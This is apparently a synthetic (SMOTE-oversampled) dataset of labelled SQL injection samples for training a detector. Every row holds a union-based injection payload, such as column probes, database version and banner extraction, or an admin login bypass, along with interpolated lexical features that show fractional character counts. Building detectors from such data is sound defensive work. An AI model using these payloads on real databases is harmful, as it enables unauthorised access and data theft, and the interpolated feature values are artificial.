id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000278,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,0.10883784484505449,72.77890205167061,26.936829157620174,4.157603860984284,25.063170842379826,23.873658315240352,15.842072894050437,8.0,0.34457013702821954,0.3279542149797532,0.21751948701514157,0.10995616097688565,1.0,0.0,3.0,0.0,0.0,0.9684145788100875,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.031585421189913,3.9684145788100875,1.0,0.0,1.0,0.0,0.0,0.9684145788100875,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.9684145788100875,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9684145788100875
SMOTE_000279,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000012,2.1027444646103888,92.39496206297952,27.354233687463115,3.8464715504671187,46.520364187758204,3.0,30.16613050029509,12.708467374926228,0.5033286923326643,0.032623357119668794,0.3251203866532032,0.13892756389446365,1.0627010623893416,1.3542336874631138,2.0,0.0,1.0,1.0,3.469446951953614e-18,3.2915326250737724,0.0,3.469446951953614e-18,1.0,4.354233687463114,0.35423368746311384,1.0,1.0,0.6457663125368861,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000280,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000044,0.02727176118391307,41.19163979386004,18.028745969079004,3.7315441556448,14.0,16.15331183508803,4.0,7.038327958772007,0.3403906608900278,0.3915312069319667,0.09725447454000793,0.17082365763799764,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,2.038327958772008,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,0.6241383808469705,77.46975980285696,26.810018476703313,3.9188423880469943,25.0,23.03970437274702,20.86011086021987,8.569944569890067,0.32397818256493577,0.29372464119680114,0.2721475149778238,0.11014966126043929,0.0,1.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.8100184767033114,0.0,3.469446951953614e-18,1.7599260931867553,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000024,0.43932006355598835,73.16707537691971,19.283292462308026,3.4240738520017118,14.0,41.73366030153577,4.0,13.433415075383943,0.1921174132223134,0.569459104133224,0.05489068949208953,0.18353279315237314,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,8.433415075383945,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,0.8397363454676402,64.14817353783974,19.691362256306622,3.5885331141613688,14.0,34.76544902522649,4.0,11.382724512613244,0.21866807335107166,0.5417134818946256,0.06247659238602046,0.17714185236828214,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.691362256306622,3.469446951953614e-18,6.691362256306622,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,2.3807725370847734,102.0,26.8766713392352,4.106812728498585,64.2466573215296,4.0,23.5616643303824,10.191678348088008,0.6298691894267607,0.039215686274509776,0.23099670912139605,0.09991841517733341,1.315007008852804,0.8766713392352028,2.0,0.0,1.0,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.0,0.4383356696176014,0.4383356696176014,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000285,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000068,1.318536856642191,117.13947808498423,29.76228021277953,4.204571622505857,37.0,45.90175829776376,17.0,17.23771978722047,0.3161878899618221,0.3913439809609766,0.14527551700948585,0.14719261206771544,3.0,0.0,2.52456042555906,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.47543957444094,5.52456042555906,1.0,0.0,0.76228021277953,0.23771978722047013,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000286,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,0.41327135944193094,62.10076700888257,24.579846598223487,4.131737601832465,27.0,17.680613607106054,11.0,6.420153401776513,0.4354562284000438,0.2839037293036518,0.1774080930518697,0.10323194924443473,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.4201534017765134,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,2.7259229949583608,106.20853224492626,25.93522938776139,4.026157707745578,65.06477061223862,4.935229387761389,26.338073469403476,9.870458775522781,0.6141002891965381,0.046154325081430525,0.24743673555917015,0.09230865016286113,1.4028440816420855,0.0,2.0,0.0,1.532385306119305,2.467614693880695,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.0,0.4676146938806952,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.4676146938806952,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.467614693880694
SMOTE_000288,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,0.14826401194697375,76.06274153737377,28.0,4.280908815272988,29.0,20.850193229899016,15.0,11.212548307474753,0.3815300825693601,0.27375161024915845,0.1973431461565656,0.14737516102491585,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,1.2125483074747536,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000289,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,0.7289504556382308,99.26746447496697,27.0,4.0484435888260935,26.267464474966967,44.0,15.683133881258259,13.316866118741743,0.2643582339608432,0.44340051651675205,0.15813002088473768,0.13411122863766708,1.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.0,4.316866118741742,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.3168661187417416,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3168661187417414
SMOTE_000290,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000018,0.4990943000946357,75.0,32.0,4.419783142073109,40.39878342668119,3.0,17.0,14.601216573318805,0.5386504456890826,0.03999999999999998,0.22666666666666666,0.19468288764425074,2.700912429989103,0.0,2.0,0.0,1.900304143329701,1.0,3.469446951953614e-18,0.0,0.0996958566702989,3.469446951953614e-18,1.0,6.900304143329701,0.9003041433297011,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000291,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,1.7858189144355026,62.647248943722516,21.83889121249761,3.909852641251115,19.45279288123447,21.033347274985665,12.741663181253584,9.419445606248805,0.3023675614432253,0.3297942955498212,0.21406322328558208,0.1537749197213714,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.5805543937511946,0.5805543937511947,3.469446951953614e-18,3.2583368187464163,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,0.2959649954183165,62.04428056470929,25.13628537098062,4.194969310343842,27.0,17.635424451767435,11.0,6.408856112941859,0.4377343166117443,0.2812037729045994,0.17833620306404394,0.1027257074196124,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.408856112941858,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000009,2.379511756882551,106.81291832857725,27.0,4.072326738230655,62.95322958214432,5.476614791072155,26.383073955360786,12.0,0.5898523318979336,0.05117001065665577,0.24647481654126707,0.11250284090414353,3.0,0.0,2.0,0.0,1.0,2.4766147910721563,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.523385208927843,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.5233852089278433,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.4766147910721567,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.476614791072157
SMOTE_000294,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,1.0629147382400612,102.31932470672298,25.319324706722984,4.045610058153124,66.0,4.0,24.0,8.319324706722984,0.6450527859657609,0.03909410824034909,0.23456464944209485,0.0812884563517952,0.0,0.0,2.0,0.0,1.6806752932770168,2.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,6.319324706722982,0.0,0.0,1.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.31932470672298296,2.0,1.0,1.9999999999999998,2.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000295,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,0.1644191235387768,68.95774501212637,24.104225498787365,4.079298152565947,27.0,23.166196009701093,11.0,7.791549002425273,0.39241449635061626,0.3349161524733437,0.1598725725872881,0.11279677858875195,1.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,3.7915490024252727,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000044,1.1785038631264007,49.281395391813064,19.24220930877196,3.7961348323956923,14.0,22.62511631345045,4.0,8.656279078362612,0.2951061433485075,0.44587262798179106,0.08431604095671641,0.1747051877129851,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,3.656279078362613,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,0.3326793272345329,82.51176257251454,28.0,4.296890317707448,29.0,26.009410058011635,15.0,12.502352514502908,0.352383178527372,0.3139542365139697,0.18226716130726137,0.15139542365139697,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.502352514502909,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000298,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,3.6811552155067107,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,2.057672458981867,1.942327541018133,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.5144181147454667,0.4855818852545333,0.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000299,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,4.850242342105991,40.46846786704668,19.76099621965255,3.9585282259347716,23.131954635830603,4.956015121389797,8.0,4.380498109826275,0.538597409157778,0.14576515062911172,0.20545112864107645,0.11018631157203382,0.0,0.0,1.8585056705211744,0.0,0.3804981098262752,0.0,3.469446951953614e-18,1.0,0.0,0.3804981098262752,0.38049810982627497,2.239003780347449,0.0,0.0,0.6195018901737248,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,0.3804981098262752,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3804981098262752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7609962196525504
SMOTE_000300,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,0.4872045502774917,94.15792691446455,27.50789634572323,4.073231347107581,29.0,36.12634153157164,15.0,14.03158538289291,0.31151787081965754,0.3789137746161871,0.16112993318258145,0.14843842138157393,3.0,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,5.03158538289291,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,2.0,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000301,attack,union,"-2204'||  (  select 'bwae' from dual where 4884  =  4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",nearest_attack_euclidean,R000064,0.926581067430499,124.17337452732016,29.173374527320156,3.917207168234465,37.0,52.0,17.0,18.173374527320156,0.2979732349993003,0.41877319513415173,0.13690662148616498,0.146346948380383,3.0,0.0,1.3467490546403136,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,9.0,4.346749054640314,1.0,0.0,0.1733745273201568,0.8266254726798432,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,2.0,1.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000302,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000063,0.04063270895471191,65.91039482085313,19.98506580347552,3.5842982355704693,14.0,35.940263213902085,4.0,11.970131606951044,0.21243799810809497,0.5452735248906123,0.06069657088802713,0.18159190611326548,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.9850658034755222,3.469446951953614e-18,6.985065803475522,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000303,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000035,0.32128733427485756,65.88690401833665,20.113095981663356,3.6409911949699043,14.0,36.0,4.0,11.886904018336644,0.21249028991685012,0.5464036026433288,0.06071151140481432,0.1803945960350067,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.8869040183366433,3.469446951953614e-18,7.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,1.2821289935563782,100.57788961247645,27.429648268746075,4.021486151195865,26.7185930749843,44.0,15.570351731253925,14.288944806238227,0.265303657872503,0.4378505550481786,0.15508715030055545,0.141758636778763,1.8592965374921508,0.0,3.0,0.0,0.0,1.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,7.0,4.429648268746075,1.0,0.0,1.0,0.0,0.0,1.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.4296482687460754,1.0,1.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4296482687460754
SMOTE_000305,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000044,0.6895877833221304,46.130236505885335,18.410418920470825,3.7000676013031475,14.0,20.104189204708266,4.0,8.026047301177066,0.31492117107080764,0.42209459471503086,0.08997747744880216,0.17300675676535937,0.0,1.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,3.469446951953614e-18,3.0260473011770666,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000306,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000013,5.08488205788229,98.616149225432,27.884560769612,4.007877942282913,54.71211191907399,4.673158845581998,27.230878460775997,12.0,0.5507012778236802,0.04613304423173886,0.27892751347103095,0.12423816447355,2.5577196151939994,0.4422803848060004,2.0,0.0,1.0,2.115439230387999,0.4422803848060004,0.8845607696120009,0.0,3.469446951953614e-18,1.0,5.115439230387999,1.0,0.44228038480600046,1.0,0.4422803848060004,0.0,1.0,0.4422803848060004,0.4422803848060004,0.0,0.0,0.0,2.0,1.0,1.5577196151939996,1.5577196151939996,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.115439230387999
SMOTE_000307,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,0.1205678778288774,61.856581550147496,23.0,4.026184056176503,27.0,16.685265240117992,11.0,7.171316310029498,0.4376342316967251,0.2683554518647191,0.17829542772829543,0.11571488871026035,1.0,0.0,3.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,3.469446951953614e-18,2.171316310029499,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,1.0,0.0,5.551115123125783e-17,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
